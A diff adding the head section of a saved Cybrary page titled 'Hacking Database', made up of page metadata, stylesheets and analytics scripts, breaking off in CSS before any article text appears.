@@ -1,0 +1,1140 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" prefix="og: http://ogp.me/ns#" class=" js_on wf-proximanova-n9-active wf-proximanova-n8-active wf-proximanova-n6-active wf-proximanova-n4-active wf-skippysharp-n4-active wf-active gr__cybrary_it" lang="en-US"><link type="text/css" id="dark-mode" rel="stylesheet" href=""><style type="text/css" id="dark-mode-custom-style"></style><head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Hacking Database - Cybrary</title>
+
+<!-- This site is optimized with the Yoast SEO plugin v4.7 - https://yoast.com/wordpress/plugins/seo/ -->
+<link rel="canonical" href="https://www.cybrary.it/0p3n/hacking-database/">
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hacking Database - Cybrary">
+<meta property="og:description" content="Hi dear hackers, Hacking database is a&nbsp;pretty cool thing you wanna do.Why databases? Certainly its about the information it holds such as passwords, credit card numbers even your girlfriend’s phone number. So here I’m going to explain how can we hack into databases using sqlmap which is">
+<meta property="og:url" content="https://www.cybrary.it/0p3n/hacking-database/">
+<meta property="og:site_name" content="Cybrary">
+<meta property="article:publisher" content="https://www.facebook.com/cybraryit/">
+<meta property="og:image" content="https://www.cybrary.it/wp-content/uploads/2018/02/rb30.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="Hi dear hackers, Hacking database is a&nbsp;pretty cool thing you wanna do.Why databases? Certainly its about the information it holds such as passwords, credit card numbers even your girlfriend’s phone number. So here I’m going to explain how can we hack into databases using sqlmap which is">
+<meta name="twitter:title" content="Hacking Database - Cybrary">
+<meta name="twitter:site" content="@cybraryIT">
+<meta name="twitter:image" content="https://www.cybrary.it/wp-content/uploads/2018/02/rb30.jpg">
+<meta name="twitter:creator" content="@cybraryIT">
+<!-- / Yoast SEO plugin. -->
+
+<link rel="dns-prefetch" href="https://www.cybrary.it/">
+<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="https://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="Cybrary » Feed" href="https://www.cybrary.it/feed/">
+<link rel="alternate" type="application/rss+xml" title="Cybrary » Comments Feed" href="https://www.cybrary.it/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Cybrary » Hacking Database Comments Feed" href="https://www.cybrary.it/0p3n/hacking-database/feed/">
+		<script async="" src="Hacking%20Database%20-%20Cybrary_files/fbevents.js"></script><script async="" type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/rtp.js"></script><script async="" src="Hacking%20Database%20-%20Cybrary_files/gtm.js"></script><script async="" src="Hacking%20Database%20-%20Cybrary_files/analytics.js"></script><script type="text/javascript" async="" src="Hacking%20Database%20-%20Cybrary_files/recaptcha__en.js"></script><script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.cybrary.it\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.5"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="Hacking%20Database%20-%20Cybrary_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="bbp-default-css" href="Hacking%20Database%20-%20Cybrary_files/bbpress.css" type="text/css" media="screen">
+<link rel="stylesheet" id="username-availability-checker-css-css" href="Hacking%20Database%20-%20Cybrary_files/username-availability-checker.css" type="text/css" media="all">
+<link rel="stylesheet" id="bp-legacy-css-css" href="Hacking%20Database%20-%20Cybrary_files/buddypress.css" type="text/css" media="screen">
+<link rel="stylesheet" id="email-availability-checker-css-css" href="Hacking%20Database%20-%20Cybrary_files/email-availability-checker.css" type="text/css" media="all">
+<link rel="stylesheet" id="ubermenu-droid-sans-css" href="Hacking%20Database%20-%20Cybrary_files/css_003.css" type="text/css" media="all">
+<link rel="stylesheet" id="yoast-seo-adminbar-css" href="Hacking%20Database%20-%20Cybrary_files/adminbar-470.css" type="text/css" media="all">
+<link rel="stylesheet" id="u-design-font-awesome-css" href="Hacking%20Database%20-%20Cybrary_files/font-awesome.css" type="text/css" media="screen">
+<link rel="stylesheet" id="u-design-google-fonts-css" href="Hacking%20Database%20-%20Cybrary_files/css_005.css" type="text/css" media="all">
+<link rel="stylesheet" id="u-design-reset-css" href="Hacking%20Database%20-%20Cybrary_files/reset.css" type="text/css" media="screen">
+<link rel="stylesheet" id="u-design-text-css" href="Hacking%20Database%20-%20Cybrary_files/text.css" type="text/css" media="screen">
+<link rel="stylesheet" id="u-design-grid-960-css" href="Hacking%20Database%20-%20Cybrary_files/960.css" type="text/css" media="screen">
+<link rel="stylesheet" id="u-design-style-css" href="Hacking%20Database%20-%20Cybrary_files/style.css" type="text/css" media="screen">
+<link rel="stylesheet" id="u-design-custom-style-css" href="Hacking%20Database%20-%20Cybrary_files/custom_style.css" type="text/css" media="screen">
+<link rel="stylesheet" id="u-design-responsive-css" href="Hacking%20Database%20-%20Cybrary_files/responsive.css" type="text/css" media="screen">
+<link rel="stylesheet" id="u-design-style-orig-css" href="Hacking%20Database%20-%20Cybrary_files/style_002.css" type="text/css" media="screen">
+<!--[if lte IE 9]>
+<link rel='stylesheet' id='u-design-ie9-css'  href='https://www.cybrary.it/wp-content/themes/u-design/styles/common-css/ie-all.css?ver=2.12.2' type='text/css' media='screen' />
+<![endif]-->
+<!--[if lte IE 7]>
+<link rel='stylesheet' id='u-design-ie7-css'  href='https://www.cybrary.it/wp-content/themes/u-design/styles/common-css/ie6-7.css?ver=2.12.2' type='text/css' media='screen' />
+<![endif]-->
+<link rel="stylesheet" id="tablepress-default-css" href="Hacking%20Database%20-%20Cybrary_files/default.css" type="text/css" media="all">
+<style id="tablepress-default-inline-css" type="text/css">
+.tablepress-id-19 .row-2 .column-2{color:#4DD965}
+</style>
+<link rel="stylesheet" id="ubermenu-css" href="Hacking%20Database%20-%20Cybrary_files/ubermenu.css" type="text/css" media="all">
+<link rel="stylesheet" id="wp-commentnavi-css" href="Hacking%20Database%20-%20Cybrary_files/commentnavi-css.css" type="text/css" media="all">
+        <script type="text/javascript">
+            function w3tc_popupadmin_bar(url) {
+                return window.open(url, '', 'width=800,height=600,status=no,toolbar=no,menubar=no,scrollbars=yes');
+            }
+        </script>
+            <script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/jquery.js" data-cfasync="false"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/jquery-migrate.js" data-cfasync="false"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var _BDUAChecker = {"selectors":"input#signup_username, form#createuser input#user_login, #registerform input#user_login, .lwa-register input#user_login"};
+/* ]]> */
+</script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/username-availability-checker.js"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/bpas-loadmore.js" data-cfasync="false"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var BP_Confirm = {"are_you_sure":"Are you sure?"};
+/* ]]> */
+</script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/confirm.js"></script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/widget-members.js"></script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/jquery-query.js"></script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/jquery-cookie.js"></script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/jquery-scroll-to.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var BP_DTheme = {"accepted":"Accepted","close":"Close","comments":"comments","leave_group_confirm":"Are you sure you want to leave this group?","mark_as_fav":"Favorite","my_favs":"My Favorites","rejected":"Rejected","remove_fav":"Remove Favorite","show_all":"Show all","show_all_comments":"Show all comments for this thread","show_x_comments":"Show all comments (%d)","unsaved_changes":"Your profile has unsaved changes. If you leave the page, the changes will be lost.","view":"View"};
+/* ]]> */
+</script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/buddypress.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var _EmailChecker = {"selectors":"input#signup_email, form#createuser input#user_email, #registerform input#user_email, .lwa-register input#user_email"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/email-availability-checker.js" data-cfasync="false"></script>
+<script data-cfasync="true" src="Hacking%20Database%20-%20Cybrary_files/ouibounce.js"></script>
+<script type="text/javascript" src="Hacking%20Database%20-%20Cybrary_files/ouibounce-config2.js" data-cfasync="false"></script>
+<!--[if lt IE 9]>
+<script type='text/javascript' src='https://www.cybrary.it/wp-content/themes/u-design/scripts/respond.min.js?ver=1.4.2' data-cfasync='false'></script>
+<![endif]-->
+<link rel="https://api.w.org/" href="https://www.cybrary.it/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.cybrary.it/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.cybrary.it/wp-includes/wlwmanifest.xml"> 
+<link rel="shortlink" href="https://www.cybrary.it/?p=111478">
+<link rel="alternate" type="application/json+oembed" href="https://www.cybrary.it/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://www.cybrary.it/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F&amp;format=xml">
+	<script type="text/javascript">
+		var ajaxurl = "https://www.cybrary.it/wp-admin/admin-ajax.php";
+	</script>
+		<script src="Hacking%20Database%20-%20Cybrary_files/api.js" async="" defer="defer"></script>
+
+	
+	<script type="text/javascript">var ajaxurl = 'https://www.cybrary.it/wp-admin/admin-ajax.php';</script>
+
+        <script type="text/javascript">
+            var ajaxurl = "https://www.cybrary.it/wp-admin/admin-ajax.php";
+        </script>
+        <style id="ubermenu-custom-generated-css">
+/** UberMenu Custom Menu Styles (Customizer) **/
+/* main */
+.ubermenu-main { background-color:#17181d; background:-webkit-gradient(linear,left top,left bottom,from(#17181d),to(#ffffff)); background:-webkit-linear-gradient(top,#17181d,#ffffff); background:-moz-linear-gradient(top,#17181d,#ffffff); background:-ms-linear-gradient(top,#17181d,#ffffff); background:-o-linear-gradient(top,#17181d,#ffffff); background:linear-gradient(top,#17181d,#ffffff); }
+.ubermenu.ubermenu-main { background:none; border:none; box-shadow:none; }
+.ubermenu.ubermenu-main .ubermenu-item-level-0 > .ubermenu-target { border:none; box-shadow:none; }
+.ubermenu.ubermenu-main.ubermenu-horizontal .ubermenu-submenu-drop.ubermenu-submenu-align-left_edge_bar, .ubermenu.ubermenu-main.ubermenu-horizontal .ubermenu-submenu-drop.ubermenu-submenu-align-full_width { left:0; }
+.ubermenu.ubermenu-main.ubermenu-horizontal .ubermenu-item-level-0.ubermenu-active > .ubermenu-submenu-drop, .ubermenu.ubermenu-main.ubermenu-horizontal:not(.ubermenu-transition-shift) .ubermenu-item-level-0 > .ubermenu-submenu-drop { margin-top:0; }
+.ubermenu-main .ubermenu-item-level-0 > .ubermenu-target { text-transform:uppercase; color:#d9d9d9; -webkit-box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); -moz-box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); -o-box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); }
+.ubermenu-main .ubermenu-nav .ubermenu-item.ubermenu-item-level-0 > .ubermenu-target { font-weight:bold; }
+.ubermenu.ubermenu-main .ubermenu-item-level-0:hover > .ubermenu-target, .ubermenu-main .ubermenu-item-level-0.ubermenu-active > .ubermenu-target { color:#f2f2f2; background-color:#6a6e76; background:-webkit-gradient(linear,left top,left bottom,from(#6a6e76),to(#6a6e76)); background:-webkit-linear-gradient(top,#6a6e76,#6a6e76); background:-moz-linear-gradient(top,#6a6e76,#6a6e76); background:-ms-linear-gradient(top,#6a6e76,#6a6e76); background:-o-linear-gradient(top,#6a6e76,#6a6e76); background:linear-gradient(top,#6a6e76,#6a6e76); }
+.ubermenu-main .ubermenu-item-level-0.ubermenu-current-menu-item > .ubermenu-target, .ubermenu-main .ubermenu-item-level-0.ubermenu-current-menu-parent > .ubermenu-target, .ubermenu-main .ubermenu-item-level-0.ubermenu-current-menu-ancestor > .ubermenu-target { color:#eaeaea; }
+.ubermenu-main .ubermenu-item-level-0.ubermenu-active > .ubermenu-target { -webkit-box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); -moz-box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); -o-box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); box-shadow:inset 1px 0 0 0 rgba(255,255,255,0); }
+.ubermenu-main .ubermenu-submenu.ubermenu-submenu-drop { background-color:#6a6e76; color:#5e18e0; }
+.ubermenu-main .ubermenu-submenu .ubermenu-column { min-width:200px; }
+.ubermenu-main .ubermenu-submenu .ubermenu-highlight { color:#dd3333; }
+.ubermenu-main .ubermenu-submenu .ubermenu-item-header > .ubermenu-target { color:#ffffff; }
+.ubermenu-main .ubermenu-submenu .ubermenu-item-header.ubermenu-has-submenu-stack > .ubermenu-target { border:none; }
+.ubermenu-main .ubermenu-submenu-type-stack { padding-top:0; }
+.ubermenu.ubermenu-main .ubermenu-item-normal > .ubermenu-target:hover { color:#000000; }
+.ubermenu.ubermenu-main .ubermenu-item-normal > .ubermenu-target:hover, .ubermenu.ubermenu-main .ubermenu-item-normal.ubermenu-active > .ubermenu-target { background-color:#a7d83e; }
+.ubermenu-main, .ubermenu-main .ubermenu-target, .ubermenu-main .ubermenu-nav .ubermenu-item-level-0 .ubermenu-target, .ubermenu-main div, .ubermenu-main p, .ubermenu-main input { font-family:'Droid Sans', sans-serif; font-weight:400; }
+
+
+/* Status: Loaded from Transient */
+
+</style>
+    <style type="text/css">
+    html { margin:0px 0px 0px 0px !important; }
+    </style>  <script id="Cookiebot" src="Hacking%20Database%20-%20Cybrary_files/uc.js" data-cbid="cc978aa4-20a1-4617-a47d-bdfc1e703569" type="text/javascript" async=""></script>
+  <!-- <script src="//code.jquery.com/ui/1.12.1/jquery-ui.js"></script> -->
+<script>
+  jQuery(document).ready(function() {
+    jQuery(".jq_nav_tab").click(function() {
+      var id = jQuery(this).data("id");
+      jQuery(".darkTab").removeClass("darkTabActive");
+      jQuery("[data-id='"+id+"'].darkTab").addClass("darkTabActive");
+      jQuery(".jq_toggleTabContent").css("display", "none");
+      jQuery("[data-id='"+id+"'].jq_toggleTabContent").css("display", "block");
+    });
+    jQuery(".sidebar_opendrawer,.sidebar_closedrawer,.overlay,.sidebar_drawertab").click(function() {
+      if (jQuery(window).width() < 960) {
+        jQuery( ".sidebar_toggle" ).toggle( "slide" );
+        jQuery( ".overlay" ).toggle();
+      }
+      if (jQuery(window).width() > 960) {
+        jQuery( ".overlay" ).hide();
+      }
+    });
+    jQuery(".primary-sidebar-tab,.viewassignment").click(function() {
+      window.scrollTo(0, 0);
+      var type = jQuery(this).data("type");
+      console.log(type);
+      jQuery(".primary-sidebar-tab").removeClass("primary-sidebar-tab-active");
+      jQuery("[data-type='"+type+"'].primary-sidebar-tab").addClass("primary-sidebar-tab-active");
+      jQuery(".sidebar_contentdiv").css("display", "none");
+      jQuery(".assignmentitemdiv").css("display", "none");
+      jQuery(".assignmentdiv").css("display", "block");
+      jQuery("[data-type='"+type+"'].sidebar_contentdiv").css("display", "block");
+    });
+    jQuery(".assignmentdiv").click(function() {
+      window.scrollTo(0, 0);
+      var type = jQuery(this).data("type");
+      if(jQuery('#myassignmentheader').length){
+        var assignmentTitle = jQuery(this).find('.team_catalog_title').text();
+        jQuery('#myassignmentheader').text('> '+assignmentTitle);
+      }
+      jQuery("[data-type='"+type+"'].assignmentitemdiv").css("display", "block");
+      jQuery(".assignmentdiv").css("display", "none");
+    });
+    jQuery(".enttag").click(function() {
+      jQuery(this).css("background", "#e8e8e8");
+    });
+    jQuery(".jq_toggle_expand").click(function() {
+      var id = jQuery(this).data("id");
+      jQuery("[data-id='"+id+"'].jq_expanded_div").toggle();
+    });
+    jQuery(document).ready(function(){
+      jQuery(".open").click(function(){
+        var type = jQuery(this).data("type");
+        jQuery("[data-type='"+type+"']").toggleClass("viewless viewmore");
+      });
+    });
+    //Dropdown
+    // jQuery(".selItem").select2();
+    // jQuery('#but_read').click(function(){
+    //   var username = jQuery('.selItem option:selected').text();
+    //   var userid = jQuery('.selItem').val();
+    //   jQuery('#result').html("id : " + userid + ", name : " + username);
+    // });
+  });
+</script>
+<style>html.async-hide { opacity: 255 !important}</style>
+<script>
+jQuery(document).ready(function(){
+if(!isUserInEu() || isUserOptInTracking()){
+jQuery("#homepage-ad").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Homepage7',eventAction: 'ClickThrough',eventLabel: 'LoggedInAd','transport': 'beacon'});
+});
+jQuery(".sv_eventcardsmall").click(function(){
+ga('send', { hitType: 'event',eventCategory: 'EventClickThrough',eventAction: ""+jQuery(this).find('a').attr('href'),eventLabel: ""+jQuery(this).find('.sv_eventcardtitle').html(),'transport': 'beacon'});
+});
+jQuery(".sv_eventcardsmall").each(function(){
+ga('send', { hitType: 'event',eventCategory: 'EventImpression',eventAction: ""+jQuery(this).find('a').attr('href'),eventLabel: ""+jQuery(this).find('.sv_eventcardtitle').html(),'transport': 'beacon'});
+});
+jQuery(".eventCard").click(function(){
+ga('send', { hitType: 'event',eventCategory: 'EventClickThrough',eventAction: ""+jQuery(this).find('a').attr('href'),eventLabel: ""+jQuery(this).find('.eventCardTitle').html(),'transport': 'beacon'});
+});
+//Profile
+jQuery(".ga_linkedin").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Profile',eventAction: 'ClickThrough',eventLabel: 'AddToLinkedin','transport': 'beacon'});
+});
+//bannerpromo
+jQuery('#ga_bannerteach').click(function(){
+ga('send', {hitType: 'event',eventCategory: 'BannerPromo',eventAction: 'ClickThrough',eventLabel: 'Teach','transport': 'beacon'});
+});
+jQuery('#ga_bannermentor').click(function(){
+ga('send', {hitType: 'event',eventCategory: 'BannerPromo',eventAction: 'ClickThrough',eventLabel: 'Mentor','transport': 'beacon'});
+});
+jQuery('#ga_bannerjob').click(function(){
+ga('send', {hitType: 'event',eventCategory: 'BannerPromo',eventAction: 'ClickThrough',eventLabel: 'GetJob','transport': 'beacon'});
+});
+//Munson on first login
+jQuery('#popup-closeA-CC').click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Marketplace',eventAction: 'January_PL_CC_A_exit',eventLabel: 'Exit','transport': 'beacon'});
+});
+//Homepagev8
+jQuery('#create1').click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Homepage7',eventAction: 'Top',eventLabel: 'CreateFreeAccount','transport': 'beacon'});
+});
+//Location /Page-PageCreateCourse.php
+//User click on Join
+jQuery('#ga_joinfromlesson').click(function(){
+ga('send', {hitType: 'event',eventCategory: 'SignUpPromotion',eventAction: 'JoinFromLesson',eventLabel: 'VideoLP','transport': 'beacon'});
+});
+//Location: functions.php
+jQuery("#ga_practicetestsidebar").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Marketplace',eventAction: 'PracticeTestSaleSidebar',eventLabel: 'StartNow','transport': 'beacon'});
+});
+jQuery("#ga_practicetestbottom").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Marketplace',eventAction: 'PracticeTestSaleBottom',eventLabel: 'StartNow','transport': 'beacon'});
+});
+//Location: page-PageBuyMonthBadge.php
+//User clicks Get started button
+jQuery("#ga_getcertified").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'SkillCertPromotion',eventAction: 'MonthlyBadgePurchase',eventLabel: 'GetStarted','transport': 'beacon'});
+});
+//User invites friends via button
+jQuery("#ga_invite").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Tell A Friend Form',eventAction: 'MonthlyBadgePurchase',eventLabel: 'Invite a Friend','transport': 'beacon'});
+});
+//Location: page-PageBuyBadge.php
+//User clicks Get started button
+jQuery("#ga_getcertified").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'SkillCertPromotion',eventAction: 'CourseBadgePurchase',eventLabel: 'GetStarted','transport': 'beacon'});
+});
+//User invites friends via button
+jQuery("#ga_invite").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Tell A Friend Form',eventAction: 'CourseBadgePurchase',eventLabel: 'Invite a Friend','transport': 'beacon'});
+});
+//Location: page-PageBuyCert.php
+//User clicks Get started button
+jQuery("#ga_getcertified").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'SkillCertPromotion',eventAction: 'CertCompletionPurchase',eventLabel: 'GetStarted','transport': 'beacon'});
+});
+//User invite friends via button
+jQuery("#ga_invite").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Tell A Friend Form',eventAction: 'CertCompletionPurchase',eventLabel: 'Invite a Friend','transport': 'beacon'});
+});
+//Location: single-channel.php
+//User leaves the channel homepage when clicking promoted content button/image if no button
+jQuery("#ga_promotedhomepagewithimage,#ga_promotedhomepagewithoutimage").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Channel',eventAction: 'ChannelHPOffsiteClick',eventLabel: 'Hacking Database','transport': 'beacon'});
+});
+//Location: class-optin-form.php
+jQuery("#ga_exitmunson").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Teams',eventAction: 'PopupClickThrough',eventLabel: 'exit-teampromo-munson','transport': 'beacon'});
+});
+jQuery("#ga_exitmunson2").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Marketplace',eventAction: 'ExitAppPromo',eventLabel: 'NotInterested','transport': 'beacon'});
+});
+jQuery("#ga_practicetestmunson").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Marketplace',eventAction: 'PracticeTestSale',eventLabel: 'LearnMore','transport': 'beacon'});
+});
+jQuery("#ga_practicelabseptembermunson").click(function(){
+ga('send', {hitType: 'event',eventCategory: 'Marketplace',eventAction: 'SeptemberPracticeLabs',eventLabel: 'LearnMore','transport': 'beacon'});
+});
+// Location: bp-custom.php
+jQuery(".up_promocolumn").click(function(){
+ga('send', { hitType: 'event',eventCategory: 'SkillCertTrivia',eventAction: 'ProfileChallenge', eventLabel: 'TriviaWidget','transport': 'beacon'});
+});
+}
+});
+</script>
+<link rel="stylesheet" href="Hacking%20Database%20-%20Cybrary_files/components.css">
+<script>
+jQuery(document).ready(function(){
+
+  jQuery("a.cbsharec").click(function(){
+
+    function cybytesIncrementor() {
+      var numOfCybytes = parseInt(jQuery('#cybytes-display').text());
+      jQuery('#cybytes-display').text(numOfCybytes + 1);
+      jQuery('#social-share-task').html('<img src="/wp-content/uploads/cybunny/check.png" alt="Completed">');
+    }
+
+    function emailTypeWindow() {
+      var a = document.createElement( 'a' );
+      a.href = url;
+      a.target = '_self';
+      a.click( );
+    }
+
+    function socialShareTypeWindow() {
+      var width = 550;
+      var height = 450;
+      var top = 100;
+      var sHeight=screen.height;
+      var sWidth=screen.width;
+      var left=Math.round((sWidth/2)-(width/2));
+      window.open(url, '_blank', 'left='+left+' , top='+top+', width='+width+', height='+height+', personalbar=0, toolbar=0, scrollbars=1, resizable=1, location=1');
+    }
+
+    var url = jQuery(this).data('url');
+    var sharetype = jQuery(this).data('sharetype');
+    var shareid = jQuery(this).data('shareid');
+    var element = jQuery(this);
+    ga('send', { hitType: 'event',eventCategory: 'Social',eventAction: 'Share',eventLabel: url,
+    'transport': 'beacon',
+    'hitCallback': function() {
+          if(sharetype == 'e'){
+            emailTypeWindow();
+          } else {
+            socialShareTypeWindow();
+          }
+      }
+    });
+  });
+});
+</script><style type="text/css" media="print">#wpadminbar { display:none; }</style>
+<link rel="pingback" href="https://www.cybrary.it/xmlrpc.php">
+
+
+
+<link href="Hacking%20Database%20-%20Cybrary_files/css.css" rel="stylesheet" type="text/css">
+<link href="Hacking%20Database%20-%20Cybrary_files/css_002.css" rel="stylesheet" type="text/css">
+<link href="Hacking%20Database%20-%20Cybrary_files/css_004.css" rel="stylesheet" type="text/css">
+<script src="Hacking%20Database%20-%20Cybrary_files/kev4yaw.js"></script><style type="text/css" id="CookieConsentStateDisplayStyles">.cookieconsent-optin,.cookieconsent-optin-preferences,.cookieconsent-optin-statistics,.cookieconsent-optin-marketing{display:block;display:initial;}.cookieconsent-optout-preferences,.cookieconsent-optout-statistics,.cookieconsent-optout-marketing,.cookieconsent-optout{display:none;}</style>
+<style type="text/css">.tk-proxima-nova{font-family:"proxima-nova",sans-serif;}.tk-skippy-sharp{font-family:"skippy-sharp",cursive;}</style><style type="text/css">@font-face{font-family:tk-proxima-nova-n9;src:url(https://use.typekit.net/af/1309c2/00000000000000000001782d/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n9&v=3) format("woff2"),url(https://use.typekit.net/af/1309c2/00000000000000000001782d/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n9&v=3) format("woff"),url(https://use.typekit.net/af/1309c2/00000000000000000001782d/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n9&v=3) format("opentype");font-weight:900;font-style:normal;}@font-face{font-family:tk-proxima-nova-n8;src:url(https://use.typekit.net/af/bcf44c/00000000000000000001782b/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n8&v=3) format("woff2"),url(https://use.typekit.net/af/bcf44c/00000000000000000001782b/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n8&v=3) format("woff"),url(https://use.typekit.net/af/bcf44c/00000000000000000001782b/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n8&v=3) format("opentype");font-weight:800;font-style:normal;}@font-face{font-family:tk-proxima-nova-n6;src:url(https://use.typekit.net/af/bf5c6c/000000000000000000017827/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff2"),url(https://use.typekit.net/af/bf5c6c/000000000000000000017827/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff"),url(https://use.typekit.net/af/bf5c6c/000000000000000000017827/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("opentype");font-weight:600;font-style:normal;}@font-face{font-family:tk-proxima-nova-n4;src:url(https://use.typekit.net/af/3ae8bb/000000000000000000017823/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/3ae8bb/000000000000000000017823/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/3ae8bb/000000000000000000017823/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) 